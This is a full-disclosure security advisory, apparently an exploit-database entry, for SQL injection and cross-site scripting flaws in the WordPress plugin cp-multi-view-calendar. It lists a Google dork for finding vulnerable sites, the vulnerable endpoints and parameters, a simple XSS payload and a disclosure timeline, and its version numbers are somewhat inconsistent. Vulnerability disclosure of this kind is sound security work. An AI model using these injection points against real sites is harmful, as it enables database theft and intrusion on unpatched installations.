@@ -1,0 +1,72 @@
+# Exploit Title: WordPress: cp-multi-view-calendar.1.1.4  [SQL Injection
+vulnerabilities]
+# Date: 2015-02-28
+# Google Dork: Index of /wordpress/wp-content/plugins/cp-multi-view-calendar
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Vendor Homepage: http://wordpress.dwbooster.com/
+# Software Link:
+https://downloads.wordpress.org/plugin/cp-multi-view-calendar.1.1.4.zip
+# Version: 1.1.5
+# Tested on: windows 7 ultimate + sqlmap 0.9. It's php aplication
+# OWASP Top10: A1-Injection
+# Mitigations: Upgrade to version 1.1.5
+
+Greetz to Christian Uriel Mondragon Zarate
+
+Video demo of unauthenticated user sqli explotation vulnerability :
+
+
+
+###################################################################
+
+ADMIN PAGE SQL INJECTION
+-------------------------------------------------
+
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=ajax_add_calendar
+
+sqlinjection in post parameter viewid
+
+-------------------------------------------------------------------
+
+http://localhost/wordpress/wp-admin/admin-ajax.php?action=ajax_delete_calendar
+
+sqlinjection in post parameter id
+
+
+########################################
+
+UNAUTENTICATED SQL INJECTION
+-----------------------------------------------------------------
+
+http://localhost/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1
+
+sql injection in id parameter
+
+-----------------------------------------------------------------------
+
+http://localhost/wordpress/?action=data_management&cpmvc_do_action=mvparse&f=datafeed&method=list&calid=1
+
+datapost viewtype=list&list_order=asc vuln variable list_order
+
+
+################################################################
+
+CROSSITE SCRIPTING VULNERABILITY
+----------------------------------------------------------
+
+http://localhost/wordpress/?action=data_management&cpmvc_do_action=mvparse&weekstartday=alert(12)&f=edit&id=1
+
+crosite script weekstartday parameter
+
+###################################################
+
+==================================
+
+time-line
+
+26-02-2015: vulnerabilities found
+27-02-2015: reported to vendor
+28-02-2015: release new cp-multi-view-calendar version 1.1.4
+28-02-2015: full disclousure
+
+===================================
